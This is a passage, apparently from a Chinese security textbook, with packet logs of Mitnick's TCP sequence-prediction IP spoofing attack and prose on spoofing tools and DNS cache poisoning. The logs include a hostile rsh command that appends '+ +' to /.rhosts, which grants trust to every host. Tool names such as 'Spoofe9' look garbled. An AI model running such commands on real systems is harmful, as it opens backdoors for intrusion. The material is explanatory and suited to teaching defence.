

1382726998:1382726998(0) win 4096
14:18:30.265684 x-terminal.shell > apollo.it.luc.edu.992: S
2022848000:2022848000(0) ack 1382726999 win 4096
14:18:30.342506 apollo.it.luc.edu.992 > x-terminal.shell: R
1382726999:1382726999(0) win 0
14:18:30.604547 apollo.it.luc.edu.991 > x-terminal.shell: S
1382726999:1382726999(0) win 4096
14:18:30.775232 x-terminal.shell > apollo.it.luc.edu.991: S
2022976000:2022976000(0) ack 1382727000 win 4096
14:18:30.852084 apollo.it.luc.edu.991 > x-terminal.shell: R
1382727000:1382727000(0) win 0

14:18:31.115036 apollo.it.luc.edu.990 > x-terminal.shell: S
1382727000:1382727000(0) win 4096
14:18:31.284694 x-terminal.shell > apollo.it.luc.edu.990: S
2023104000:2023104000(0) ack 1382727001 win 4096
14:18:31.361684 apollo.it.luc.edu.990 > x-terminal.shell: R
1382727001:1382727001(0) win 0
14:18:31.627817 apollo.it.luc.edu.989 > x-terminal.shell: S
1382727001:1382727001(0) win 4096
14:18:31.795260 x-terminal.shell > apollo.it.luc.edu.989: S
2023232000:2023232000(0) ack 1382727002 win 4096
14:18:31.873056 apollo.it.luc.edu.989 > x-terminal.shell: R
1382727002:1382727002(0) win 0
14:18:32.164597 apollo.it.luc.edu.988 > x-terminal.shell: S
1382727002:1382727002(0) win 4096

14:18:32.335373 x-terminal.shell > apollo.it.luc.edu.988: S
2023360000:2023360000(0) ack 1382727003 win 4096
14:18:32.413041 apollo.it.luc.edu.988 > x-terminal.shell: R
1382727003:1382727003(0) win 0
14:18:32.674779 apollo.it.luc.edu.987 > x-terminal.shell: S
1382727003:1382727003(0) win 4096
14:18:32.845373 x-terminal.shell > apollo.it.luc.edu.987: S
2023488000:2023488000(0) ack 1382727004 win 4096
14:18:32.922158 apollo.it.luc.edu.987 > x-terminal.shell: R
1382727004:1382727004(0) win 0
14:18:33.184839 apollo.it.luc.edu.986 > x-terminal.shell: S
1382727004:1382727004(0) win 4096

14:18:33.355505 x-terminal.shell > apollo.it.luc.edu.986: S
2023616000:2023616000(0) ack 1382727005 win 4096
14:18:33.435221 apollo.it.luc.edu.986 > x-terminal.shell: R
1382727005:1382727005(0) win 0
14:18:33.695170 apollo.it.luc.edu.985 > x-terminal.shell: S
1382727005:1382727005(0) win 4096
14:18:33.985966 x-terminal.shell > apollo.it.luc.edu.985: S
2023744000:2023744000(0) ack 1382727006 win 4096
14:18:34.062407 apollo.it.luc.edu.985 > x-terminal.shell: R
1382727006:1382727006(0) win 0
14:18:34.204953 apollo.it.luc.edu.984 > x-terminal.shell: S
1382727006:1382727006(0) win 4096
14:18:34.375641 x-terminal.shell > apollo.it.luc.edu.984: S
2023872000:2023872000(0) ack 1382727007 win 4096
14:18:34.452830 apollo.it.luc.edu.984 > x-terminal.shell: R
1382727007:1382727007(0) win 0

14:18:34.714996 apollo.it.luc.edu.983 > x-terminal.shell: S
1382727007:1382727007(0) win 4096
14:18:34.885071 x-terminal.shell > apollo.it.luc.edu.983: S
2024000000:2024000000(0) ack 1382727008 win 4096
14:18:34.962030 apollo.it.luc.edu.983 > x-terminal.shell: R
1382727008:1382727008(0) win 0
14:18:35.225869 apollo.it.luc.edu.982 > x-terminal.shell: S
1382727008:1382727008(0) win 4096

14:18:35.395723 x-terminal.shell > apollo.it.luc.edu.982: S
2024128000:2024128000(0) ack 1382727009 win 4096
14:18:35.472150 apollo.it.luc.edu.982 > x-terminal.shell: R
1382727009:1382727009(0) win 0
14:18:35.735077 apollo.it.luc.edu.981 > x-terminal.shell: S
1382727009:1382727009(0) win 4096
14:18:35.905684 x-terminal.shell > apollo.it.luc.edu.981: S
2024256000:2024256000(0) ack 1382727010 win 4096
14:18:35.983078 apollo.it.luc.edu.981 > x-terminal.shell: R
1382727010:1382727010(0) win 0

接下来我们看到的是来自伪装服务器（login）向 X-terminal 发起的伪造连接请求，攻击者预测了序列号。这是基于之前对 X-terminal 的 TCP 序列号的发现。通过这种欺骗手段，攻击者（在本例中为 Mitnick）控制了从伪装成 server.login 的 X-terminal.shell 到 X-terminal 的通信：

14:18:36.245045 server.login > x-terminal.shell: S
1382727010:1382727010(0) win 4096
14:18:36.755522 server.login > x-terminal.shell: . ack 2024384001 win 4096
14:18:37.265404 server.login > x-terminal.shell: P 0:2(2) ack 1 win 4096
14:18:37.775872 server.login > x-terminal.shell: P 2:7(5) ack 1 win 4096
14:18:38.287404 server.login > x-terminal.shell: P 7:32(25) ack 1 win 4096
14:18:37 server# rsh x-terminal "echo + + >>/.rhosts"
14:18:41.347003 server.login > x-terminal.shell: . ack 2 win 4096
14:18:42.255978 server.login > x-terminal.shell: . ack 3 win 4096
14:18:43.165874 server.login > x-terminal.shell: F 32:32(0) ack 3 win 4096
14:18:52.179922 server.login > x-terminal.shell: R
1382727043:1382727043(0) win 4096
14:18:52.236452 server.login > x-terminal.shell: R
1382727044:1382727044(0) win 4096

然后连接被重置，以清空 server.login 的连接队列，以便再次接受连接：

14:18:52.298431 130.92.6.97.600 > server.login: R
1382726960:1382726960(0) win 4096
14:18:52.363877 130.92.6.97.601 > server.login: R
1382726961:1382726961(0) win 4096
14:18:52.416916 130.92.6.97.602 > server.login: R
1382726962:1382726962(0) win 4096
14:18:52.476873 130.92.6.97.603 > server.login: R
1382726963:1382726963(0) win 4096
14:18:52.536573 130.92.6.97.604 > server.login: R
1382726964:1382726964(0) win 4096
14:18:52.600899 130.92.6.97.605 > server.login: R
1382726965:1382726965(0) win 4096
14:18:52.660231 130.92.6.97.606 > server.login: R
1382726966:1382726966(0) win 4096
14:18:52.717495 130.92.6.97.607 > server.login: R
1382726967:1382726967(0) win 4096
14:18:52.776502 130.92.6.97.608 > server.login: R
1382726968:1382726968(0) win 4096
14:18:52.836536 130.92.6.97.609 > server.login: R
1382726969:1382726969(0) win 4096
14:18:52.937317 130.92.6.97.610 > server.login: R
1382726970:1382726970(0) win 4096
14:18:52.996777 130.92.6.97.611 > server.login: R
1382726971:1382726971(0) win 4096
14:18:53.056758 130.92.6.97.612 > server.login: R
1382726972:1382726972(0) win 4096
14:18:53.116850 130.92.6.97.613 > server.login: R
1382726973:1382726973(0) win 4096
14:18:53.177515 130.92.6.97.614 > server.login: R
1382726974:1382726974(0) win 4096
14:18:53.238496 130.92.6.97.615 > server.login: R
1382726975:1382726975(0) win 4096
14:18:53.297163 130.92.6.97.616 > server.login: R
1382726976:1382726976(0) win 4096
14:18:53.365988 130.92.6.97.617 > server.login: R
1382726977:1382726977(0) win 4096
14:18:53.437287 130.92.6.97.618 > server.login: R
1382726978:1382726978(0) win 4096
14:18:53.496789 130.92.6.97.619 > server.login: R
1382726979:1382726979(0) win 4096
14:18:53.556753 130.92.6.97.620 > server.login: R
1382726980:1382726980(0) win 4096
14:18:53.616954 130.92.6.97.621 > server.login: R
1382726981:1382726981(0) win 4096
14:18:53.676828 130.92.6.97.622 > server.login: R
1382726982:1382726982(0) win 4096
14:18:53.736734 130.92.6.97.623 > server.login: R
1382726983:1382726983(0) win 4096
14:18:53.796732 130.92.6.97.624 > server.login: R
1382726984:1382726984(0) win 4096
14:18:53.867543 130.92.6.97.625 > server.login: R
1382726985:1382726985(0) win 4096
14:18:53.917466 130.92.6.97.626 > server.login: R
1382726986:1382726986(0) win 4096
14:18:53.976769 130.92.6.97.627 > server.login: R
1382726987:1382726987(0) win 4096
14:18:54.039039 130.92.6.97.628 > server.login: R
1382726988:1382726988(0) win 4096
14:18:54.097093 130.92.6.97.629 > server.login: R
1382726989:1382726989(0) win 4096

![](img/ba85bb40c695c02adae8cbd6666f2e0c_419_0.png)

**图 8.18** Windows IP Spoofer。

在通过 IP 地址欺骗获得 root 权限后不久，Mitnick 编译了一个内核模块并将其强制加载到现有的 STREAMS 堆栈上，该模块旨在控制一个 tty 设备。

通常，在完成一次入侵攻击后，黑客会在系统中编译一个后门，以便于未来的入侵和远程控制。理论上，IP 欺骗之所以可能，是因为可信服务仅依赖于基于网络地址的身份验证。PC-DOS 系统常见的欺骗软件包括 Command IP Spoofe9、IP Spoofe9（如图 8.18 所示）和 Domain WinSpoof；Erect 常用于 UNIX 系统。

最近，人们投入了大量精力研究 DNS 欺骗。欺骗 DNS 缓存服务器使攻击者能够将访客重定向到除目标网站外的其他位置。请记住，域名是一个基于字符的句柄，用于标识一个或多个 IP 地址。域名服务（DNS）将这些域名转换回各自的 IP 地址。（这项服务的存在原因很简单，即字母域名比 IP 地址更容易记忆。）还要记住，通过 Internet 传输的数据报使用地址；因此，每次指定域名时，必须有一个 DNS 服务守护进程将名称转换为相应的 IP 地址。基本上，通过在浏览器中输入一个域名，例如 TigerTools.net，DNS 服务器会将这个字母域名映射到一个 IP 地址，然后你就会跳转过去查看该网站。

使用这种形式的欺骗，攻击者强制 DNS“客户端”生成一个对“服务器”的请求，然后欺骗来自该“服务器”的响应。这起作用的原因之一是大多数 DNS 服务器支持“递归”查询。从根本上说，你可以向任何 DNS 服务器发送请求，要求它执行名称到地址的转换。为了满足请求，该 DNS 服务器会向合适的服务器发送正确的查询以获取此信息。然而，黑客技术使入侵者能够预测受害服务器将发出什么请求，从而通过插入虚假的网站来欺骗响应。如果执行成功，欺骗的回复将在实际响应到达之前到达。这对黑客很有用，因为 DNS 服务器会在指定时间内“缓存”信息。如果入侵者能够成功欺骗诸如 www.yahoo.com 的响应，那么该 DNS 服务器的任何合法用户都将被重定向到入侵者的网站。

